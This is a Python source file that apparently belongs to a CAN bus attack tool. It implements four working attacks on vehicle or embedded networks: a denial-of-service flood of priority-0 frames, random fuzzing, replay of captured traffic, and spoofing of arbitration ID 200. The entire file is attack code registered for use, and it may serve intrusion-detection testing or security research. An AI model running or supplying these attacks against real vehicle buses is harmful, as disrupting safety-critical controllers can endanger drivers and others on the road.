# attacks.py
#
# purpose: implements all attack types

from data import log_utils
import can
import random
import sys
import attack.manager

ARBITRATION_MAX = 2 ** 11 - 1
DATA_MAX        = 2 ** 8 - 1

def dos(manager):
    """Perform a denial of service attack"""
    msg = can.Message(arbitration_id=0x0,
                      data=[0, 0, 0, 0, 0, 0, 0, 0],
                      extended_id=False)

    while manager.should_continue():
        manager.attack(msg)

def fuzz(manager):
    """Send uniformly random messages to the bus"""
    while manager.should_continue():
        data_list = []
        for _ in range(8):
            data_list.append(random.randint(0, DATA_MAX))
        msg = can.Message(arbitration_id=random.randint(0, ARBITRATION_MAX),
            data=data_list, extended_id=False)
        manager.attack(msg)

def replay(manager):
    """Replay messages seen on the bus with close to uniform probability"""

    # capture at least 8 messages before replaying
    replay_ref = []
    for _ in range(20):
        msg = attack.manager.bus.recv(timeout=1)
        if msg: replay_ref.append(msg)
        if len(replay_ref) >= 8:
            break
    else:
        print("Error: could not capture 8 messages within 20 seconds", file=sys.stderr)
        sys.exit(1)

    while manager.should_continue():
        # replay a random mesasge from the ones we've stored
        manager.attack(random.choice(replay_ref))

        # capture a message to add to our reference. It won't be the msg we sent
        msg = attack.manager.bus.recv(timeout=1)
        if msg: replay_ref.append(msg)
        
def spoof(manager):
    can_data = [0,0,0,0,0,0,0,0]
    msg = can.Message(arbitration_id=200,
                          data=can_data,
                          extended_id=False,
                          is_error_frame=False)

    while manager.should_continue():
        manager.attack(msg)

        if(can_data[5] >= 0xFF):
            can_data[5] = 0
            if(can_data[4] >= 0xFF):
                can_data[4] = 0
            else:
                can_data[4] += 1
        else:
            can_data[5] += 1
        msg.data = can_data

# all attacks must be registered in this dict of function pointers
attack_dict = {
        'dos' : dos,
        'fuzz' : fuzz,
        'replay' : replay,
        'spoof' : spoof,
}
